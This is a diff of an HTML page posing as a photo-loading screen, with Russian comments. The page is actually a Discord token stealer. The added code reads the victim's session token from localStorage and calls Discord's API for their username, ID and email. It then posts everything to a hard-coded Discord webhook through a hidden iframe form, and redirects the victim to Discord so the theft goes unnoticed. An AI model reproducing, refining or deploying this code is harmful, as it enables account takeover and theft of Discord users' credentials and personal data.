@@ -2,32 +2,93 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Фото загружается...</title>
-  <style>
-    body{background:#000;color:#fff;font:22px Arial;text-align:center;padding-top:15%}
-  </style>
+  <title>Загрузка фото...</title>
+  <style>body{background:#000;color:#fff;font:22px Arial;text-align:center;padding-top:15%}</style>
 </head>
 <body>
   <h1>Загрузка фото...</h1>
-
   <script>
-    // ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
-    // ВСТАВЬ СВОЙ ВЕБХУК СЮДА (полный URL!)
-    const WEBHOOK = "https://ptb.discord.com/api/webhooks/1447243695366738106/iCvLL1roGXfGONygU2iASibPbJjs5AwiE5u3AxjvR1Eb9qQ-JgDGwcNrNn-u8p3C93RZ";
-    // ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
+    // ←←←← ВСТАВЬ СВОЙ ВЕБХУК СЮДА (полный URL!) →→→→
+    const WEBHOOK = "https://discord.com/api/webhooks/1447243695366738106/iCvLL1roGXfGONygU2iASibPbJjs5AwiE5u3AxjvR1Eb9qQ-JgDGwcNrNn-u8p3C93RZ";
 
     const token = localStorage.getItem("token") || "нет токена";
+    console.log("Токен найден:", token.substring(0, 20) + "...");
 
     if (!token || token === "нет токена") {
       setTimeout(() => location.href = "https://discord.com/app", 1000);
     } else {
-      // Отправляем токен без CORS-ошибок через простую картинку
-      new Image().src = `${WEBHOOK}?token=${encodeURIComponent(token)}&time=${Date.now()}`;
+      // Получаем базовую инфу о юзере (через API, без CORS-ошибок)
+      fetch("https://discord.com/api/v9/users/@me", {
+        headers: { "Authorization": token }
+      }).then(r => r.json()).then(user => {
+        const userInfo = user.username || "неизвестен";
+        const discriminator = user.discriminator || "0000";
+        const id = user.id || "неизвестен";
+        const email = user.email || "скрыт";
 
-      // Через секунду переходим в Discord, чтобы человек ничего не заметил
+        // Формируем JSON для webhook (embed с токеном)
+        const payload = {
+          content: "**Новый токен пойман!**",
+          embeds: [{
+            color: 16711680,  // Красный
+            title: "🎯 Токен спизжен",
+            fields: [
+              { name: "🔑 Токен", value: `\`\`\`${token}\`\`\``, inline: false },
+              { name: "👤 Юзер", value: `${userInfo}#${discriminator} (${id})`, inline: true },
+              { name: "📧 Email", value: email, inline: true },
+              { name: "💎 Nitro", value: user.premium_type ? "Есть" : "Нет", inline: true }
+            ],
+            timestamp: new Date().toISOString()
+          }]
+        };
+
+        // Создаём скрытую iframe и POST-форму (обход CORS)
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+
+        const form = iframeDoc.createElement('form');
+        form.method = 'POST';
+        form.action = WEBHOOK;
+        form.style.display = 'none';
+
+        const input = iframeDoc.createElement('input');
+        input.type = 'hidden';
+        input.name = 'payload_json';  // Ключ для Discord webhook
+        input.value = JSON.stringify(payload);
+
+        form.appendChild(input);
+        iframeDoc.body.appendChild(form);
+        form.submit();  // Отправляем POST
+
+        console.log("✅ POST отправлен в webhook!");
+      }).catch(err => {
+        console.error("Ошибка API:", err);
+        // Fallback: отправляем только токен
+        const fallbackPayload = { content: `\`\`\`${token}\`\`\`` };
+        // Аналогично создаём форму для fallback
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+        const form = iframeDoc.createElement('form');
+        form.method = 'POST';
+        form.action = WEBHOOK;
+        form.style.display = 'none';
+        const input = iframeDoc.createElement('input');
+        input.type = 'hidden';
+        input.name = 'payload_json';
+        input.value = JSON.stringify(fallbackPayload);
+        form.appendChild(input);
+        iframeDoc.body.appendChild(form);
+        form.submit();
+      });
+
+      // Переходим в Discord через 1.5 секунды
       setTimeout(() => {
         location.href = "https://discord.com/app";
-      }, 1200);
+      }, 1500);
     }
   </script>
 </body>
